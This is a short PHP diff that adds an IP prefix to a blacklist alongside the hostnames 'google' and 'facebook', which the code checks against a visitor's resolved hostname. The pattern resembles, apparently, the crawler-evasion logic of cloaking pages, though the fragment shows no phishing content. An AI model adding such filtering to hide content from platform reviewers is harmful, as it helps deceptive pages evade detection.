@@ -39,6 +39,7 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 $hostname = gethostbyaddr($ip);
 $host_verify = true;
 $blacklist = array(
+  "66.220.145",
   "google",
   "facebook"
 );
